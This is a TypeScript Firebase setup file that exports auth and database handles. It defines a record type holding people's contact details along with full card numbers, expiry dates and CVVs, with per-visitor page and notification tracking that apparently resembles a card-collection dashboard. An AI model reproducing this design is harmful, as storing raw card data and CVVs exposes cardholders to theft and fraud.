import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDhxG88L_y9pQtTrJWrBBg-0tDuMRdp7AU",
  authDomain: "jahorsc.firebaseapp.com",
  projectId: "jahorsc",
  storageBucket: "jahorsc.firebasestorage.app",
  messagingSenderId: "467680981623",
  appId: "1:467680981623:web:f92b78fe506017bf760c72",
  measurementId: "G-BS1K64NRJQ"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
